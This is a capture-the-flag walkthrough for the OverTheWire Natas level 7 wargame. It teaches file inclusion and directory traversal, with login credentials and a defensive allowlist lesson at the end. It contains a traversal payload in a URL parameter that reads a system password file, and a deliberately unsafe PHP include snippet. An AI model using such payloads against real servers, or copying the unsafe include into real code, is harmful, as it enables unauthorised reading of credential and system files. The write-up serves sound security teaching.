# Natas 7

## What This Level Teaches

This level introduces **file inclusion** and **directory traversal**.

The main lesson is:

> **If user input is used to choose a file, the server must carefully restrict what files can be loaded.**

A page parameter that looks harmless can become dangerous if it is passed directly into something like PHP `include`.

---

## Goal

Find the password for **`natas8`**.

## Login

- **URL:** `http://natas7.natas.labs.overthewire.org`
- **Username:** `natas7`
- **Password:** `B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0`

---

## Walkthrough

### 1. Open the Natas 7 Page

Go to:

```text
http://natas7.natas.labs.overthewire.org
```

Log in with the username and password above.

The page has links such as:

```text
Home
About
```

Clicking them changes the URL to something like:

```text
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

### 2. Notice the `page` Parameter

The important part of the URL is:

```text
page=home
```

This means the page is using a URL parameter named `page`.

The server likely reads that value and uses it to decide what content to show.

### 3. View the Page Source

Open the page source.

Inside the HTML source, there is a hint pointing to the password file:

```text
/etc/natas_webpass/natas8
```

That is the file we want the server to read.

### 4. Try Directory Traversal

The page parameter loads local content. If the server does not restrict the path properly, we can try moving out of the current directory with:

```text
../
```

Each `../` means "go up one directory."

The goal is to climb up far enough, then point to the password file:

```text
../../../../../../../../../etc/natas_webpass/natas8
```

Use it in the URL like this:

```text
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../etc/natas_webpass/natas8
```

### 5. Read the Password

If the server includes or reads that file, the page displays the password for Natas 8:

```text
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
```

---

## How Did We Know to Use Directory Traversal?

The URL shows that the page content is controlled by a parameter:

```text
?page=home
```

The reasoning is:

1. The page changes content based on the `page` parameter.
2. The server may be using that parameter as a filename.
3. The source code hint tells us the target file path.
4. `../` can move up directories in a filesystem path.
5. If the application does not block traversal, the parameter can point outside the intended folder.
6. The server reads the password file and returns its contents.

---

## What Is File Inclusion?

File inclusion means a program loads another file as part of building the response.

In PHP, this is often done with functions such as:

```php
include
```

or:

```php
require
```

For example, a site might load different content based on a URL parameter:

```php
include($_GET["page"]);
```

This is unsafe if the user can control the value without restrictions.

---

## What Is Directory Traversal?

Directory traversal is a technique for moving through folders using path syntax.

The special path:

```text
../
```

means "go up one directory."

For example:

```text
../../secret.txt
```

means:

1. Go up one directory.
2. Go up one more directory.
3. Open `secret.txt`.

In Natas 7, we use several `../` sections to climb out of the web page directory and reach:

```text
/etc/natas_webpass/natas8
```

---

## Common Mistake

Do not stop at a directory.

This path only climbs upward:

```text
../../../../../../../../../
```

That points to a directory, not a file. PHP `include` needs a file to include.

The path must end with the target file:

```text
../../../../../../../../../etc/natas_webpass/natas8
```

---

## Security Lesson

Never pass user input directly into file-loading functions.

Applications should restrict user input to known safe values. For example, instead of letting the user choose any path, the server could map allowed page names to specific files.

Example idea:

```text
home  -> pages/home.html
about -> pages/about.html
```

That way, the user can choose `home` or `about`, but cannot choose arbitrary system files.

---

## Key Takeaways

- URL parameters can affect what the server does.
- `page=home` suggests the server may be loading content based on user input.
- `../` moves up one directory in a filesystem path.
- Directory traversal can reach files outside the intended folder.
- File-loading functions must validate and restrict user input.
